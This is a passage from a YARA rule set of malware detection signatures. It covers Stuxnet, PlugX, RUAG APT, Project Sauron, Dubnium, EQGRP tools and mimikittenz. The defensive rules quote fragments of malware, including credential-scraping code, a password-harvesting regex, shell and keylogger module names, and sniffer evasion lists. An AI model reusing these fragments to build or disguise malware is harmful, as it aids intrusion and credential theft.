      $s3 = "SMAC=%02x:%02x:%02x:%02x:%02x:%02x" fullword ascii
      $s4 = "Not everything is set yet" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 30KB and 2 of them )
} 

rule APT_EQGRP_1212_RID2AF9 : APT DEMO T1136 {
   meta:
      description = "Detects tool from EQGRP toolset - file 1212.pl"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-15 08:46:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "if (!(($srcip,$dstip,$srcport,$dstport) = ($line=~/^([a-f0-9]{8})([a-f0-9]{8})([a-f0-9]{4})([a-f0-9]{4})$/)))" fullword ascii
      $s2 = "$ans=\"$srcip:$srcport -> $dstip:$dstport\";" fullword ascii
      $s3 = "return \"ERROR:$line is not a valid port\";" fullword ascii
      $s4 = "$dstport=hextoPort($dstport);" fullword ascii
      $s5 = "sub hextoPort" fullword ascii
      $s6 = "$byte_table{\"$chars[$sixteens]$chars[$ones]\"}=$i;" fullword ascii
   condition: 
      filesize < 6KB and 4 of them
} 

rule APT_EQGRP_1212_dehex_RID2D66 : APT DEMO FILE T1136 {
   meta:
      description = "Detects tool from EQGRP toolset - from files 1212.pl, dehex.pl"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-15 10:30:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "return \"ERROR:$line is not a valid address\";" fullword ascii
      $s2 = "print \"ERROR: the filename or hex representation needs to be one argument try using \\\"'s\\n\";" fullword ascii
      $s3 = "push(@octets,$byte_table{$tempi});" fullword ascii
      $s4 = "$byte_table{\"$chars[$sixteens]$chars[$ones]\"}=$i;" fullword ascii
      $s5 = "print hextoIP($ARGV[0]);" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x2123 and filesize < 6KB and ( 5 of ( $s* ) ) ) or ( all of them )
} 

rule APT_Project_Sauron_arping_module_RID33C8 : APT DEMO G0041 T1136 {
   meta:
      description = "Detects strings from arping module - Project Sauron report by Kaspersky"
      author = "Florian Roth"
      reference = "https://goo.gl/eFoP4A"
      date = "2016-08-08 15:02:31"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, G0041, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Resolve hosts that answer" 
      $s2 = "Print only replying Ips" 
      $s3 = "Do not display MAC addresses" 
   condition: 
      all of them
} 

rule APT_Project_Sauron_kblogi_module_RID33BF : APT DEMO G0041 T1136 {
   meta:
      description = "Detects strings from kblogi module - Project Sauron report by Kaspersky"
      author = "Florian Roth"
      reference = "https://goo.gl/eFoP4A"
      date = "2016-08-08 15:01:01"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, G0041, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Inject using process name or pid. Default" 
      $s2 = "Convert mode: Read log from file and convert to text" 
      $s3 = "Maximum running time in seconds" 
   condition: 
      $x1 or 2 of them
} 

rule APT_Project_Sauron_basex_module_RID335A : APT DEMO G0041 T1136 {
   meta:
      description = "Detects strings from basex module - Project Sauron report by Kaspersky"
      author = "Florian Roth"
      reference = "https://goo.gl/eFoP4A"
      date = "2016-08-08 14:44:11"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, G0041, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "64, 64url, 32, 32url or 16." 
      $s2 = "Force decoding when input is invalid/corrupt" 
      $s3 = "This cruft" 
   condition: 
      $x1 or 2 of them
} 

rule APT_Project_Sauron_dext_module_RID32FC : APT DEMO G0041 T1136 {
   meta:
      description = "Detects strings from dext module - Project Sauron report by Kaspersky"
      author = "Florian Roth"
      reference = "https://goo.gl/eFoP4A"
      date = "2016-08-08 14:28:31"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, G0041, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Assemble rows of DNS names back to a single string of data" 
      $x2 = "removes checks of DNS names and lengths (during split)" 
      $x3 = "Randomize data lengths (length/2 to length)" 
      $x4 = "This cruft" 
   condition: 
      2 of them
} 

rule Hacktool_This_Cruft_RID2EA0 : APT DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Detects string 'This cruft' often used in hack tools like netcat or cryptcat and also mentioned in Project Sauron report"
      author = "Florian Roth"
      reference = "https://goo.gl/eFoP4A"
      date = "2016-08-08 11:22:31"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "This cruft" fullword
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and $x1 )
} 

rule Typical_Malware_String_Transforms_RID3473 : DEMO EXE FILE MAL SUSP T1136 {
   meta:
      description = "Detects typical strings in a reversed or otherwise modified form"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2016-07-31 15:31:01"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      nodeepdive = "1"
      tags = "DEMO, EXE, FILE, MAL, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $e1 = "exe.tsohcvs" fullword ascii
      $e2 = "exe.ssasl" fullword ascii
      $e3 = "exe.rerolpxe" fullword ascii
      $e4 = "exe.erolpxei" fullword ascii
      $e5 = "exe.23lldnur" fullword ascii
      $e6 = "exe.dmc" fullword ascii
      $e7 = "exe.llikksat" fullword ascii
      $l1 = "lld.23lenreK" fullword ascii
      $l2 = "lld.ESABLENREK" fullword ascii
      $l3 = "lld.esabtpyrc" fullword ascii
      $l4 = "lld.trcvsm" fullword ascii
      $l5 = "LLD.LLDTN" fullword ascii
      $i1 = "paeHssecorPteG" fullword ascii
      $i2 = "sserddAcorPteG" fullword ascii
      $i3 = "AyrarbiLdaoL" fullword ascii
      $i4 = "AssecorPetaerC" fullword ascii
      $r1 = "teSlortnoCtnerruC" fullword ascii
      $r2 = "nuR\\noisreVtnerruC" fullword ascii
      $f1 = "\\23metsys\\" ascii
      $f2 = "\\23metsyS\\" ascii
      $f3 = "niB.elcyceR$" fullword ascii
      $f4 = "%tooRmetsyS%" fullword ascii
      $fp1 = "Application Impact Telemetry Static Analyzer" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and 1 of them and not 1 of ( $fp* ) )
} 

rule Invoke_mimikittenz_RID2E91 : DEMO FILE HKTL T1086 T1136 {
   meta:
      description = "Semiautomatically generated YARA rule - file Invoke-mimikittenz.ps1"
      author = "Florian Roth"
      reference = "https://github.com/putterpanda/mimikittenz"
      date = "2016-07-19 11:20:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, HKTL, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "[mimikittenz.MemProcInspector]" ascii
      $s1 = "PROCESS_ALL_ACCESS = PROCESS_TERMINATE | PROCESS_CREATE_THREAD | PROCESS_SET_SESSIONID | PROCESS_VM_OPERATION |" fullword ascii
      $s2 = "IntPtr processHandle = MInterop.OpenProcess(MInterop.PROCESS_WM_READ | MInterop.PROCESS_QUERY_INFORMATION, false, process.Id);" fullword ascii
      $s3 = "&email=.{1,48}&create=.{1,2}&password=.{1,22}&metadata1=" ascii
      $s4 = "[DllImport(\"kernel32.dll\", SetLastError = true)]" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x7566 and filesize < 60KB and 2 of them ) or $x1
} 

rule APT_StuxNet_Malware_1_RID2EE8 : APT DEMO MAL {
   meta:
      description = "Stuxnet Sample - file malware.exe"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2016-07-09 11:34:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, MAL"
      minimum_yara = "1.7"
      
   strings:
      $op1 = { 8b 45 08 35 dd 79 19 ae 33 c9 8b 55 08 89 02 89 } 
      $op2 = { 74 36 8b 7f 08 83 ff 00 74 2e 0f b7 1f 8b 7f 04 } 
      $op3 = { 74 70 81 78 05 8d 54 24 04 75 1b 81 78 08 04 cd } 
   condition: 
      all of them
} 

rule APT_Stuxnet_Malware_2_RID2F09 : APT DEMO EXE FILE MAL T1136 {
   meta:
      description = "Stuxnet Sample"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2016-07-09 11:40:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "\\SystemRoot\\System32\\hal.dll" fullword wide
      $s2 = "http://www.jmicron.co.tw0" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 70KB and all of them
} 

rule APT_StuxNet_dll_RID2CCB : APT DEMO EXE FILE T1136 {
   meta:
      description = "Stuxnet Sample - file dll.dll"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2016-07-09 10:04:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "SUCKM3 FROM EXPLORER.EXE MOTH4FUCKA #@!" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and $s1
} 

rule APT_Stuxnet_Malware_4_RID2F0B : APT DEMO EXE FILE MAL T1136 {
   meta:
      description = "Stuxnet Sample"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2016-07-09 11:40:21"
      score = 100
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "\\objfre_w2k_x86\\i386\\guava.pdb" ascii
      $x2 = "MRxCls.sys" fullword wide
      $x3 = "MRXNET.Sys" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 80KB and 1 of them ) or ( all of them )
} 

rule APT_Stuxnet_Shortcut_to_RID304D : APT DEMO FILE T1136 T1210 {
   meta:
      description = "Stuxnet Sample - file Copy of Shortcut to.lnk"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2016-07-09 12:34:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136, T1210"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "\\\\.\\STORAGE#Volume#_??_USBSTOR#Disk&Ven_Kingston&Prod_DataTraveler_2.0&Rev_PMAP#5B6B098B97BE&0#{53f56307-b6bf-11d0-94f2-00a0c" wide
   condition: 
      uint16 ( 0 ) == 0x004c and filesize < 10KB and $x1
} 

rule APT_Stuxnet_Malware_3_RID2F0A : APT DEMO EXE FILE MAL T1136 {
   meta:
      description = "Stuxnet Sample - file ~WTR4141.tmp"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2016-07-09 11:40:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "SHELL32.DLL.ASLR." fullword wide
      $s1 = "~WTR4141.tmp" fullword wide
      $s2 = "~WTR4132.tmp" fullword wide
      $s3 = "totalcmd.exe" fullword wide
      $s4 = "wincmd.exe" fullword wide
      $s5 = "http://www.realtek.com0" fullword ascii
      $s6 = "{%08x-%08x-%08x-%08x}" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 150KB and ( $x1 or 3 of ( $s* ) ) ) or ( 5 of them )
} 

rule APT_Stuxnet_maindll_decrypted_unpacked_RID365D : APT DEMO T1045 T1136 {
   meta:
      description = "Stuxnet Sample - file maindll.decrypted.unpacked.dll_"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2016-07-09 16:52:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1045, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "%SystemRoot%\\system32\\Drivers\\mrxsmb.sys;%SystemRoot%\\system32\\Drivers\\*.sys" fullword wide
      $s2 = "<Actions Context=\"%s\"><Exec><Command>%s</Command><Arguments>%s,#%u</Arguments></Exec></Actions>" fullword wide
      $s3 = "%SystemRoot%\\inf\\oem7A.PNF" fullword wide
      $s4 = "%SystemRoot%\\inf\\mdmcpq3.PNF" fullword wide
      $s5 = "%SystemRoot%\\inf\\oem6C.PNF" fullword wide
      $s6 = "@abf varbinary(4096) EXEC @hr = sp_OACreate 'ADODB.Stream', @aods OUT IF @hr <> 0 GOTO endq EXEC @hr = sp_OASetProperty @" wide
      $s7 = "STORAGE#Volume#1&19f7e59c&0&" fullword wide
      $s8 = "view MCPVREADVARPERCON as select VARIABLEID,VARIABLETYPEID,FORMATFITTING,SCALEID,VARIABLENAME,ADDRESSPARAMETER,PROTOKOLL,MAXLIMI" ascii
   condition: 
      6 of them
} 

rule APT_Stuxnet_s7hkimdb_RID2EC8 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Stuxnet Sample - file s7hkimdb.dll"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2016-07-09 11:29:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "S7HKIMDX.DLL" fullword wide
      $op1 = { 8b 45 08 35 dd 79 19 ae 33 c9 8b 55 08 89 02 89 } 
      $op2 = { 74 36 8b 7f 08 83 ff 00 74 2e 0f b7 1f 8b 7f 04 } 
      $op3 = { 74 70 81 78 05 8d 54 24 04 75 1b 81 78 08 04 cd } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 40KB and $x1 and all of ( $op* ) )
} 

rule Furtim_nativeDLL_RID2D4A : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects Furtim malware - file native.dll"
      author = "Florian Roth"
      reference = "MISP 3971"
      date = "2016-06-13 10:25:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "FqkVpTvBwTrhPFjfFF6ZQRK44hHl26" fullword ascii
      $op0 = { e0 b3 42 00 c7 84 24 ac } 
      $op1 = { a1 e0 79 44 00 56 ff 90 10 01 00 00 a1 e0 79 44 } 
      $op2 = { bf d0 25 44 00 57 89 4d f0 ff 90 d4 02 00 00 59 } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 900KB and $s1 or all of ( $op* )
} 

rule Dubnium_Sample_2_RID2D37 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects sample mentioned in the Dubnium Report"
      author = "Florian Roth"
      reference = "https://goo.gl/AW9Cuu"
      date = "2016-06-10 10:22:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = ":*:::D:\\:c:~:" fullword ascii
      $s2 = "SPMUVR" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them )
} 

rule Dubnium_Sample_SSHOpenSSL_RID3077 : DEMO EXE FILE MAL T1021 T1136 {
   meta:
      description = "Detects sample mentioned in the Dubnium Report"
      author = "Florian Roth"
      reference = "https://goo.gl/AW9Cuu"
      date = "2016-06-10 12:41:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1021, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "sshkeypairgen.exe" fullword wide
      $s2 = "OpenSSL: FATAL" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 9000KB and all of them
} 

rule Dubnium_Sample_1_RID2D36 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects sample mentioned in the Dubnium Report"
      author = "Florian Roth"
      reference = "https://goo.gl/AW9Cuu"
      date = "2016-06-10 10:22:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $key1 = "3b840e20e9555e9fb031c4ba1f1747ce25cc1d0ff664be676b9b4a90641ff194" fullword ascii
      $key2 = "90631f686a8c3dbc0703ffa353bc1fdf35774568ac62406f98a13ed8f47595fd" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them
} 

rule Dubnium_Sample_5_RID2D3A : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects sample mentioned in the Dubnium Report"
      author = "Florian Roth"
      reference = "https://goo.gl/AW9Cuu"
      date = "2016-06-10 10:22:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$innn[i$[i$^i[e[mdi[m$jf1Wehn[^Whl[^iin_hf$11mahZijnjbi[^[W[f1n$dej$[hn]1[W1ni1l[ic1j[mZjchl$$^he[[j[a[1_iWc[e[" fullword ascii
      $s2 = "h$YWdh[$ij7^e$n[[_[h[i[[[\\][1$1[[j1W1[1cjm1[$[k1ZW_$$ncn[[Inbnnc[I9enanid[fZCX" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 9000KB and all of them
} 

rule Dubnium_Sample_6_RID2D3B : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects sample mentioned in the Dubnium Report"
      author = "Florian Roth"
      reference = "https://goo.gl/AW9Cuu"
      date = "2016-06-10 10:23:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&()`~-_=+[{]{;',." fullword ascii
      $s2 = "e_$0[bW\\RZY\\jb\\ZY[nimiRc[jRZ]" fullword ascii
      $s3 = "f_RIdJ0W9RFb[$Fbc9[k_?Wn" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 4000KB and all of them
} 

rule Dubnium_Sample_7_RID2D3C : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects sample mentioned in the Dubnium Report"
      author = "Florian Roth"
      reference = "https://goo.gl/AW9Cuu"
      date = "2016-06-10 10:23:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "hWI[$lZ![nJ_[[lk[8Ihlo8ZiIl[[[$Ynk[f_8[88WWWJW[YWnl$$Z[ilf!$IZ$!W>Wl![W!k!$l!WoW8$nj8![8n_I^$[>_n[ZY[[Xhn_c!nnfK[!Z" fullword ascii
      $s2 = "[i_^])[$n!]Wj^,h[,!WZmk^o$dZ[h[e!&W!l[$nd[d&)^Z\\^[[iWh][[[jPYO[g$$e&n\\,Wfg$[<g$[[ninn:j!!)Wk[nj[[o!!Y" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 9000KB and all of them
} 

rule SharpCat_RID2A27 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Detects Hack Tool SharpCat_RID2A27 - file SharpCat_RID2A27.exe"
      author = "Florian Roth"
      reference = "https://github.com/Cn33liz/SharpCat_RID2A27"
      date = "2016-06-10 03:56:41"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "ShellZz" fullword ascii
      $s2 = "C:\\Windows\\System32\\cmd.exe" fullword wide
      $s3 = "currentDirectory" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 20KB and all of them
} 

rule RUAG_APT_srsvc_RID2C14 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects malware used in the RUAG APT case"
      author = "Florian Roth"
      reference = "https://www.govcert.admin.ch/blog/22/technical-report-about-the-ruag-espionage-case"
      date = "2016-06-09 09:33:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "SVCHostServiceDll.dll" fullword ascii
      $s2 = "msimghlp.dll" fullword wide
      $s3 = "srservice" fullword wide
      $s4 = "ModStart" fullword ascii
      $s5 = "ModStop" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 20KB and ( 1 of ( $x* ) or all of ( $s* ) ) ) or ( all of them )
} 

rule RUAG_APT_Malware_Gen1_RID2E56 : APT DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects malware used in the RUAG APT case"
      author = "Florian Roth"
      reference = "https://www.govcert.admin.ch/blog/22/technical-report-about-the-ruag-espionage-case"
      date = "2016-06-09 11:10:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "too long data for this type of transport" fullword ascii
      $x2 = "not enough server resources to complete operation" fullword ascii
      $x3 = "Task not execute. Arg file failed." fullword ascii
      $x4 = "Global\\MSCTF.Shared.MUTEX.ZRX" fullword ascii
      $s1 = "peer has closed the connection" fullword ascii
      $s2 = "tcpdump.exe" fullword ascii
      $s3 = "windump.exe" fullword ascii
      $s4 = "dsniff.exe" fullword ascii
      $s5 = "wireshark.exe" fullword ascii
      $s6 = "ethereal.exe" fullword ascii
      $s7 = "snoop.exe" fullword ascii
      $s8 = "ettercap.exe" fullword ascii
      $s9 = "miniport.dat" fullword ascii
      $s10 = "net_password=%s" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and ( 2 of ( $x* ) or 8 of ( $s* ) ) ) or ( 12 of them )
} 

rule RUAG_APT_Malware_Gen2_RID2E57 : APT DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects malware used in the RUAG APT case"
      author = "Florian Roth"
      reference = "https://www.govcert.admin.ch/blog/22/technical-report-about-the-ruag-espionage-case"
      date = "2016-06-09 11:10:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Internal command not support =((" fullword ascii
      $x2 = "L|-1|AS_CUR_USER:OpenProcessToken():%d, %s|" fullword ascii
      $x3 = "L|-1|CreateProcessAsUser():%d, %s|" fullword ascii
      $x4 = "AS_CUR_USER:OpenProcessToken():%d" fullword ascii
      $x5 = "L|-1|AS_CUR_USER:LogonUser():%d, %s|" fullword ascii
      $x6 = "L|-1|try to run dll %s with user priv|" fullword ascii
      $x7 = "\\\\.\\Global\\PIPE\\sdlrpc" fullword ascii
      $x8 = "\\\\%s\\pipe\\comnode" fullword ascii
      $x9 = "Plugin dll stop failed." fullword ascii
      $x10 = "AS_USER:LogonUser():%d" fullword ascii
      $s1 = "MSIMGHLP.DLL" fullword wide
      $s2 = "msimghlp.dll" fullword ascii
      $s3 = "ximarsh.dll" fullword ascii
      $s4 = "msximl.dll" fullword ascii
      $s5 = "INTERNAL.dll" fullword ascii
      $s6 = "\\\\.\\Global\\PIPE\\" fullword ascii
      $s7 = "ieuser.exe" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and ( 1 of ( $x* ) or 5 of ( $s* ) ) ) or ( 10 of them )
} 

rule RUAG_APT_Malware_Gen3_RID2E58 : APT DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects malware used in the RUAG APT case"
      author = "Florian Roth"
      reference = "https://www.govcert.admin.ch/blog/22/technical-report-about-the-ruag-espionage-case"
      date = "2016-06-09 11:10:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Mozilla/4.0 (compatible; MSIE %d.0; " fullword ascii
      $x2 = "\\\\.\\pipe\\sdlrpc" fullword ascii
      $x3 = "WaitMutex Abandoned %p" fullword ascii
      $x4 = "OPER|Wrong config: no port|" fullword ascii
      $x5 = "OPER|Wrong config: no lastconnect|" fullword ascii
      $x6 = "OPER|Wrong config: empty address|" fullword ascii
      $x7 = "Trans task %d obj %s ACTIVE fail robj %s" fullword ascii
      $x8 = "OPER|Wrong config: no auth|" fullword ascii
      $x9 = "OPER|Sniffer '%s' running... ooopppsss...|" fullword ascii
      $s1 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\5.0\\User Agent\\Post Platform" fullword ascii
      $s2 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\5.0\\User Agent\\Pre Platform" fullword ascii
      $s3 = "www.yahoo.com" fullword ascii
      $s4 = "MSXIML.DLL" fullword wide
      $s5 = "www.bing.com" fullword ascii
      $s6 = "%s: http://%s%s" fullword ascii
      $s7 = "/javascript/view.php" fullword ascii
      $s8 = "Task %d failed %s,%d" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and ( 1 of ( $x* ) or 6 of ( $s* ) ) ) or ( 10 of them )
} 

rule PlugX_J16_Gen_RID2B8A : DEMO EXE FILE GEN MAL T1136 {
   meta:
      description = "Detects PlugX Malware samples from June 2016"
      author = "Florian Roth"
      reference = "MISP 3954"
      date = "2016-06-08 09:10:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, GEN, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "%WINDIR%\\SYSTEM32\\SERVICES.EXE" fullword wide
      $x2 = "\\\\.\\PIPE\\RUN_AS_USER(%d)" fullword wide
      $x3 = "LdrLoadShellcode" fullword ascii
      $x4 = "Protocol:[%4s], Host: [%s:%d], Proxy: [%d:%s:%d:%s:%s]" fullword ascii
      $s1 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\User Agent\\Post Platform" fullword wide
      $s2 = "%s\\msiexec.exe %d %d" fullword wide
      $s3 = "l%s\\sysprep\\CRYPTBASE.DLL" fullword wide
      $s4 = "%s\\msiexec.exe UAC" fullword wide
      $s5 = "CRYPTBASE.DLL" fullword wide
      $s6 = "%ALLUSERSPROFILE%\\SxS" fullword wide
      $s7 = "%s\\sysprep\\sysprep.exe" fullword wide
      $s8 = "\\\\.\\pipe\\a%d" fullword wide
      $s9 = "\\\\.\\pipe\\b%d" fullword wide
      $s10 = "EName:%s,EAddr:0x%p,ECode:0x%p,EAX:%p,EBX:%p,ECX:%p,EDX:%p,ESI:%p,EDI:%p,EBP:%p,ESP:%p,EIP:%p" fullword ascii
      $s11 = "Mozilla/4.0 (compatible; MSIE " fullword wide
      $s12 = "; Windows NT %d.%d" fullword wide
      $s13 = "SOFTWARE\\Microsoft\\Internet Explorer\\Version Vector" fullword wide
      $s14 = "\\bug.log" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 600KB and ( 1 of ( $x* ) or 4 of ( $s* ) ) ) or ( 8 of them )
} 

rule PlugX_J16_Gen2_RID2BBC : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects PlugX Malware Samples from June 2016"
      author = "Florian Roth"
      reference = "MISP 3954"
      date = "2016-06-08 09:19:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "XPlugKeyLogger.cpp" fullword ascii
      $s2 = "XPlugProcess.cpp" fullword ascii
      $s4 = "XPlgLoader.cpp" fullword ascii
      $s5 = "XPlugPortMap.cpp" fullword ascii
      $s8 = "XPlugShell.cpp" fullword ascii
      $s11 = "file: %s, line: %d, error: [%d]%s" fullword ascii
      $s12 = "XInstall.cpp" fullword ascii
      $s13 = "XPlugTelnet.cpp" fullword ascii
      $s14 = "XInstallUAC.cpp" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 600KB and ( 2 of ( $s* ) ) ) or ( 5 of them )
} 

